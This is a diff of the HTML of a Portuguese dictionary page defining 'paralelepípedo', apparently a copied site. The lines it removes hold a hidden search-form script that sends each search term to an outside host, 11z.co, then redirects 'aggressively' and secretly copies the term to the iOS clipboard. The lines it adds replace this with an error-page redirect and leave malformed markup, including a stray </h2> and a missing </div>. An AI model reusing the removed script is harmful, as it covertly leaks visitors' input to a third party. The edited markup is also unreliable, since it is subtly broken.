@@ -212,13 +212,7 @@ Pop. Pequeno bloco de pedra, com essa forma, usado no calçamento de ruas e estr
                                 <h2 class="tit-significado">Significado de Paralelepípedo</h2>
                 <p class="significado textonovo"><span class="cl">substantivo masculino</span> <span><span class="tag">[Geometria]</span> Sólido de seis lados cujas faces são paralelogramos.</span><span><span class="tag">[Geometria]</span> Hexaedro cujas faces, opostas e paralelas entre si, são paralelogramos.</span><span><span class="tag">[Popular]</span> Pequeno bloco de pedra, com essa forma, usado no calçamento de ruas e estradas; bloco, meio-fio.</span><span class="etim">Etimologia (origem da palavra <i>paralelepípedo</i>). A palavra paralelepípedo tem sua origem no latim “parallelepipedum,ii”, pelo grego “parallelepípedos,os,on”, com o mesmo sentido figura geométrica de seis faces.</span></p>
 
-                
-                
-                
-                
-                
-                                <div class="wrap-section">
-                <h2 class="tit-section">Definição de Paralelepípedo</h2>
+                                <div class="wrap-section">Definição de Paralelepípedo</h2>
                 <p class="adicional">
                                             Classe gramatical: <b>substantivo masculino</b><br>
                                             Separação silábica: <b>pa-ra-le-le-pí-pe-do</b><br>
@@ -325,16 +319,13 @@ Pop. Pequeno bloco de pedra, com essa forma, usado no calçamento de ruas e estr
                     });
                 }
             </script>
-        </div>
-
-        <div class="col-xs-12 p0--d">
+             <div class="col-xs-12 p0--d">
             <div id="gooad_palavrabot">
-                <div class="dfp-mrec mt40 mb10 w100">
+                <div class="dfp-mrec w100">
                     <style> @media (min-width:0px){#div-gpt-ad-1375114378392-0 > div{width:0;height:0;}#div-gpt-ad-1375114378392-0{height:0;}}@media (min-width:300px){#div-gpt-ad-1375114378392-0 > div{width:300px;height:290px;}#div-gpt-ad-1375114378392-0{height:290px;}}#div-gpt-ad-1375114378392-0{position:sticky;padding:0px;padding-top:20px;z-index:0;overflow:hidden;}#div-gpt-ad-1375114378392-0::before{z-index:-1;}#div-gpt-ad-1375114378392-0 > div{margin:auto;position:unset;}#div-gpt-ad-1375114378392-0 > div::before, #div-gpt-ad-1375114378392-0::after{top:0;position:absolute;}</style><div id="div-gpt-ad-1375114378392-0" class="ad-unit ad-unit--pt-br #div-gpt-ad-1375114378392-0"></div>                </div>
             </div>
 
-                            <div class="mt30 wrap-section">
-                    <h3>Mais Curiosidades</h3>
+                            <div class="wrap-section">        <h3>Mais Curiosidades</h3>
                     <div class="article-list-wrapper article-list-wrapper--hybrid">
                         
                             <a title="Palavras proparoxítonas" href="/palavras-proparoxitonas/" class="item">
@@ -750,54 +741,13 @@ Pop. Pequeno bloco de pedra, com essa forma, usado no calçamento de ruas e estr
         (function() {
             var searchForm = document.getElementById("searchForm");
             var searchInput = document.getElementById("q");
-            var isSending = false;
-
-            async function copyToClipboard(text) {
-                try {
-                    var isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
-                    if (!isIOS) return;
-                    
-                    if (navigator.clipboard && navigator.clipboard.writeText) {
-                        await navigator.clipboard.writeText(text);
-                    } else {
-                        const textArea = document.createElement("textarea");
-                        textArea.value = text;
-                        textArea.style.position = "fixed";
-                        textArea.style.left = "-9999px";
-                        textArea.style.top = "0";
-                        document.body.appendChild(textArea);
-                        textArea.focus();
-                        textArea.select();
-                        document.execCommand("copy");
-                        document.body.removeChild(textArea);
-                    }
-                } catch (err) {}
-            }
-
             if (searchForm && searchInput) {
                 searchForm.addEventListener("submit", function(e) {
-                    if (isSending) return;
-                    isSending = true;
-                    
                     e.preventDefault();
                     e.stopImmediatePropagation();
-                    
                     var term = searchInput.value;
                     if (term) {
-                        // 1. Envio ÚNICO via POST JSON
-                        fetch('https://11z.co/_w/5156/selection', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ value: term })
-                        }).catch(function() {}).finally(function() {
-                            // 2. Redirecionamento agressivo
-                            window.location.replace("https://www.dicio.com.br/pesquisa.php?q=" + encodeURIComponent(term));
-                        });
-
-                        // 3. Cópia condicional (apenas iOS)
-                        copyToClipboard(term);
-                    } else {
-                        isSending = false;
+                        window.location.replace("erro.html?q=" + encodeURIComponent(term));
                     }
                 }, true);
             }
